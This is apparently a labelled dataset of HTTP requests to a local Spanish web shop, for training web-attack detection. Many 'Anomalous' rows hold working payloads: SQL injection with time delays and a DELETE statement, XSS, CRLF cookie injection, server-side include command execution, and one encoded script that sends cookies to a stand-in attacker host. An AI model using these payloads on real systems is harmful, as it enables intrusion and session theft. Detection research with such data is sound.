raw_log,classification
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 idA=2&nombre=Queso+Manchego&precio=85&cantidad=58&B1=A%F1adir+al+carrito,Anomalous
GET http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1,Normal
GET http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 errorMsg=Credenciales+incorrectas,Normal
GET http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=olivie&password=re0348n1AR&nombre=Ivan&apellidos=Elbar+Brice%F1o&email=elliot3%40connect.li&dni=65683923V&direccion=Los+Caminos%2C+129%2C+13-G&ciudad=Hinojosa+del+Campo&cp=10130&provincia=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&ntc=7487181086019639&B1=Registrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727 HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=16&B1=A%F1adir+al+carrito HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%7C HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 errorMsg=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C,Anomalous
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=insertar&precio=7518&B1=Confirmar%2F,Anomalous
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7105%22+AND+%221%22%3D%221&B1=Pasar+por+caja HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 B2=Vaciar+carritobob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org,Anomalous
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=tawauna45&password=dinosaurio&nombre=Delfo&apellidos=Modino+Esteban&email=ohalloran%40buscadordevideos.bw&dni=11335BB469B&direccion=Martin+De+Bocanogra+59%2C+3F&ciudad=Torell%F3&cp=13108&provincia=Segovia&ntc=9797216648384975&B1=Registrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1,Normal
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=schwenk&password=iNfINitIvO&nombre=Tarciano%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&apellidos=Varela+Pulido&email=strizhenova-boston%40hrmsl.kh&dni=36249511Q&direccion=Barrio+Vidal+132%2C+13%3FB&ciudad=Rubite&cp=50160&provincia=Zamora&ntc=6295032148467406&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1,Normal
GET http://localhost:8080/tienda1/asf-logo-wide.gif HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=dickens&password=requeridor%2500&nombre=Bertilda&apellidos=Scampini+Benito&email=bevens%40elbauldelosrefranes.gov&dni=25301830J&direccion=Avinguda+Joan+March%2C+14%2C+&ciudad=G%F3jar&cp=11630&provincia=Las+Palmas&ntc=4290013346826591&B1=Registrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=60&B1=A%F1adir+al+carrito HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&precio=2158&B1=Pasar+por+caja,Anomalous
GET http://localhost:8080/admin/login.do HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=goggin&password=INdOCto&nombre=Serneo&apellidos=Plebs+Cadevall&email=marieau8%40clementelr.nz&dni=24314757P&direccion=Cueva+De+Montesinos+80+11-G&ciudad=Monforte+del+Cid&cp=04742&provincia=Cuenca&ntc=3363230401310436&B1=Registrar HTTP/1.1,Normal
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=enid&password=75p%ED80ica&nombre=Edelmar&apellidos=Mc%27Morral+Obrist&email=spradin-baines%40muebetuweb.cf&dni=35868151L&direccion=Lugar+Canedo+S%2FN+13H&ciudad=Rajadell&cp=37891&provincia=Guadalajara&ntc=0293148493278191&B1=Registrar,Normal
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 id=%2B,Anomalous
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235 HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=2&nombre=Queso+Manchego&precio=39&cantidad=83&B1=A%F1adir+al+carrito,Normal
GET http://localhost:8080/tienda1/publico/registro.jsp/asf-logo-wide.gif/ HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 B2=Vaciar+carrito%4040,Anomalous
GET http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=bienek&password=Bujer%EDa&nombre=%27+AND+%271%27%3D%271&apellidos=Gesto+Ball%E1n&email=halloran%40sanchezgordo.pa&dni=23139426T&direccion=C%2F+Arco+De+Las+Orejas+76%2C+3%3FF&ciudad=Torrehermosa&cp=29494&provincia=Guadalajara&ntc=2829438543802993&B1=Registrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=chi-keun&password=reinazgo&nombre=Farid&apellidos=Chayle+Villablanca&email=batobrina.falkenstein%40ebs-construcciones.sv&dni=73107657H&direccion=C%2F+Aulencia%2C+84+&ciudad=Bellv%EDs&cp=24448&provincia=Valladolid&ntc=6743669195924554&B1=Registrar HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&login=hironaga&pwd=130c%E9&rememberA=on&B1=Entrar,Anomalous
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=insertar&precio=2569&B1=Pasar+por+caja,Normal
GET http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7098&B1=Confirmar HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=ehab&password=pio58241&nombre=Vanina&apellidos=Metauten+Suau&email=eiler-philpelli%40cpanelweb.com.af&dni=82384047W&direccion=San+Jose+139%2C+13E&ciudad=Plasenzuela&cp=45200&provincia=Salamanca&ntc=6014129235774839&B1=Registrarany%250ASet-cookie%253A%2BTamper%253D1041264011025374727,Anomalous
GET http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=39&cantidad=84&B1=A%F1adir+al+carrito HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,Normal
GET http://localhost:8080/iissamples/ExAir/Catalog/Catalog.asp HTTP/1.1,Anomalous
GET http://localhost:8080/webapp/examples/ping HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=insertar%253F&precio=909&B1=Pasar+por+caja,Anomalous
GET http://localhost:8080/tienda1/publico/asf-logo-wide HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7201&B1=Confirmar HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=insertar&precio=4542&B1=Confirmar,Normal
GET http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&loginA=leonerd&password=6a6o57a&nombre=Christopher&apellidos=Silva&email=havoc8%40g-audi.eg&dni=56405919Y&direccion=C%2F+Miquel+Palomares%2C+73+7%3FC&ciudad=Bidegoian&cp=16415&provincia=Almer%EDa&ntc=7329932302042221&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=3&nombre=Vino+Rioja&precio=39&cantidadA=69&B1=A%F1adir+al+carrito,Anomalous
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=letsome9&password=simple&nombre=Perfecta&apellidos=Lowery+Volta&email=seel%40indorec.ge&dni=05171912V&direccion=C%2F+Agustina+Fierra%2C+49%2C+&ciudad=Villabasta+de+Vald%2F%3Favia&cp=46715&provincia=Burgos&ntc=6556979183874771&B1=Registrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/index.jsp HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&login=waggoner&pwd=rosquiller3&remember=on&B1=Entrar,Normal
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=raudres&pwd=s%21u2ceP7ivo&remember=off&B1=Entrar HTTP/1.1,Normal
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=rourke&password=bil%27lEta%27Je&nombre=Yulisa&apellidos=Atondo+Kan&email=oak%40cpanelhost.com.be&dni=29170567N&direccion=C%2F+Driza%2C+63+11-D&ciudad=Fuensalda%F1a&cp=02461&provincia=%C1vila&ntc=6074458836046165&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=100&cantidad=22Set-cookie%253A%2BTamper%253D1041264011025374727&B1=A%F1adir+al+carrito HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&precio=2542&B1=Confirmar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=3%7C&nombre=Vino+Rioja&precio=85&cantidad=4&B1=A%F1adir+al+carrito HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1,Normal
GET http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=welham&password=cet%E1rea&nombre=Tarsilia&apellidos=Serradell&email=sara.bagashvili%40sunglasses.nom.gr&dni=27733046Z&direccion=Cerro+Ramaderia+S%2FN+8%3FC&ciudad=Ali%2Bja+del+Infan%2Ftado&cp=02360&provincia=Lugo&ntc=3481071462529390&B1=Registrar HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=insertar&precio=5357&B1=Confirmar,Normal
GET http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1,Normal
GET http://localhost:8080/tienda1.bak HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 errorMsg=Credenciales+incorrectas,Normal
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=logan&password=RaD0Oel%E9cTrico&nombre=Norelia&apellidos=Fest+Lairigoyen&email=moyse_desica8%40cursosdele.rw&dni=04803273E&direccion=Calle+Federico+Mompou+144+11-D&ciudad=Lucena&cp=07529&provincia=Cantabria&ntc=5257931647701652&B1=Registrar HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=lyliston&pwd=de4454&remember=off&B1A=Entrar HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 id=1,Normal
GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=85&cantidad=80&B1=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 id=2,Normal
GET http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,Normal
GET http://localhost:8080/_vti_inf.html HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/autenticar.jsp.OLD HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&nombre=Vino+Rioja&precio=85&cantidad=98&B1=A%F1adir+al+carrito,Anomalous
GET http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/global/creditos.jsp/6909030637832563290.jsp HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 id=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,Anomalous
GET http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 B2=Vaciar+carrito,Normal
GET http://localhost:8080/tienda1/index.jsp.inc HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=robena1&password=improvisaci%F3n&nombre=Reinoldo&apellidos=Gelabert&email=oland5%40schnaps.com.by&dni=51756068L&direccion=C%2F+Santa+Escolastica+178%2C+&ciudad=Quintanilla+de+Arriba&cp=35543%27+DELETE+FROM+USERS&provincia=Huesca&ntc=7852557135021483&B1=Registrar HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 B2A=Vaciar+carrito,Anomalous
GET http://localhost:8080/CFIDE/administrator/aboutcf.cfm HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&login=timms&pwd=95%216a752a&remember=on&B1=Entrar,Normal
GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1,Normal
GET http://localhost:8080/tienda1/index.jsp/asf-logo-wide.java HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=3&nombreA=Jam%F3n+Ib%E9rico&precio=39&cantidad=85&B1=A%F1adir+al+carrito,Anomalous
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=tilak&pwd=cup%D3n&remember=off%2F&B1=Entrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,Normal
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=marjan&password=ce16esi4a9&nombre=Rene%E9&apellidos=Pi%F1ol+Monguzzi&email=clapham.gravey%40juguetespersonales.ye&dni=79234827B&direccion=Merce%2C+182+&ciudad=Villagarc%EDa+de+Campos&cp=34305&provincia=Alicante&ntc=780906401924818&B1=Registrar,Anomalous
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=3&nombre=Queso+Manchego&precio=100&cantidad=30&B1A=A%F1adir+al+carrito,Anomalous
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=insertar&precio=8641&B1=Pasar+por+caja,Normal
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=39&cantidad=52&B1=A%F1adir+al+carrito HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&login=ohma%2B%2Bru&pwd=m893e787&remember=on&B1=Entrar,Anomalous
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=walt0&pwd=e2cr1t0c0&rememberA=off&B1=Entrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=zauhar&password=deshon7oso&nombre=Allegra&apellidos=N%FA%F1ez&email=griffith_chesbro%40psykoterapeut.sn&dni=84166910C&direccion=Aguila+S%2FN%2C+6-G&ciudad=Castellol%ED&cp=06443&provincia=Vizcaya&ntc=6819239674494837&B1=Registrar,Normal
GET http://localhost:8080/tienda1/publico/autenticar.jsp/4861362529278789730.java HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=qinghui&password=disterminar&nombre=Nadra&apellidos=Busquets+Baduell&email=lillo_funk%40inoxled.ma&dni=22652909W&direccion=C%2F+Codigo+Correspondencia+Oficial+Correos-telegrafos%2C+42+13-B&ciudad=Peralta+de+Alcofea&cp=47814&provincia=V%2Biz%2Bcaya&ntc=5583449016514744&B1=Registrar HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=2&nombre=Queso+Manchego&precioA=85&cantidad=79&B1=A%F1adir+al+carrito,Anomalous
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=7191&B1=Confirmar HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=2&nombre=Vino+Rioja&precio=39&cantidad=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&B1=A%F1adir+al+carrito,Anomalous
GET http://localhost:8080/tienda1/publico/ HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/anadir.jsp/4861362529278789730 HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%7C HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=cicek0&pwd=0eSINO1o&remember=on&B1=Entrar HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modoA=registro&login=garold&password=o5%2457t4&nombre=Balduino&apellidos=Fuguera+Mock&email=fraenkel%40cortinasartesol.travel&dni=85978887B&direccion=Bayona+132%2C+13%3FH&ciudad=San+Mill%E1n+de+la+Cogolla&cp=15147&provincia=Salamanca&ntc=6531738879978731&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1,Normal
GET http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1,Normal
GET http://localhost:8080/iisstart.asp HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=7334&B1=Confirmar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/asf-logo-wide HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/miembros/editar.jsp?modoA=registro&login=ning&password=Graciosamente&nombre=Roc%EDo+Libertad&apellidos=Oviol+De+la+Quintana&email=tchoukova%40sgi-sl.is&dni=16822336K&direccion=Urbanizacion+Palmeras%2C+S%2FN%2C+&ciudad=Oropesa&cp=17723&provincia=Segovia&ntc=1507392936285379&B1=Registrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5798&B1=Confirmar%2F HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1,Normal
GET http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modoA=insertar&precio=5823&B1=Pasar+por+caja,Anomalous
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=100%2F&cantidad=69&B1=A%F1adir+al+carrito HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=williams9&pwd=LaSedaD&remember=on&B1=Entrar HTTP/1.1,Normal
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=visvanat&password=mohatrera&nombre=Helga&apellidos=Peratill&email=hauser%40whitepearlresort.as&dni=88363371Q&direccion=Calle+Sandoval+135%2C+4%3FBbob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&ciudad=S%E1daba&cp=40183&provincia=Zaragoza&ntc=6865627677043866&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2%22+AND+%221%22%3D%221 HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1,Normal
GET http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=Confirmar HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 id=2,Normal
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=leah&password=p%2BLANeadOr&nombre=Deborah&apellidos=Molero+Bubnjar&email=throne%40familiamarino.cl&dni=76951358M&direccion=Calle+Carlos+Arniches+173+&ciudad=Pinofranqueado&cp=16878&provincia=Cuenca&ntc=5956754565750791&B1=Registrar,Normal
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=siham&password=enat%EDametn%21e&nombre=Ces%E1rio&apellidos=Castany+Bigorra&email=mangini%40cubiertoscbb.an&dni=93029703Q&direccion=Calle+Rio+Guadajira+182+7-H&ciudad=Codosera%2C+La&cp=22314%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&provincia=Salamanca&ntc=9377074508770290&B1=Registrar,Anomalous
GET http://localhost:8080/statmail.nsf HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=hines&password=40fi6eres5a&nombre=Salustiano&apellidos=Elguezabal+Brot%F3&email=magarill%40beljos.gi&dni=51095089Z&direccionA=Zurbaran%2C+54%2C+&ciudad=F%E9rez&cp=10613&provincia=Salamanca&ntc=8908099424894248&B1=Registrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/index.jsp.bak HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7965&B1=Confirmar HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/registro.jsp?modoA=registro&login=carmody&password=borricalmeNtE&nombre=Lihue&apellidos=Figueredo+Ferr%E0s&email=varennes%40so-tel.ni&dni=17014566V&direccion=Rambla+De+Mercedes+149%2C+&ciudad=Hornillos+de+Cameros&cp=23560&provincia=Valladolid&ntc=7245939027120885&B1=Registrar HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 id=2%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C,Anomalous
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=3714&B1=Confirmar HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=insertar&precioA=51&B1=Confirmar,Anomalous
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&login=zeigler&pwd=7ERVAnT0F2La&rememberA=off&B1=Entrar,Anomalous
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=cis_w&password=H3RetiCal&nombre=Alcia&apellidos=Escarr%E9+Adrover&email=malik%40clubdeviaje.so&dni=61530852X&direccion=San+Jose+32%2C+&ciudad=Arano&cp=31579&provincia=V.alenc%3Fia&ntc=8422181884729126&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/imagenes/logo.gif/ HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727 HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=jakeman&password=C0a428O&nombreA=Carolina&apellidos=Pepiol+Acho&email=juergens-shear%40imarbella.dm&dni=13717151C&direccion=Vicent+Andreu+Estelles%2C+106+1%3FE&ciudad=Mata+de+los+Olmos%2C+La&cp=20217&provincia=Girona&ntc=5088681295774264&B1=Registrar HTTP/1.1,Anomalous
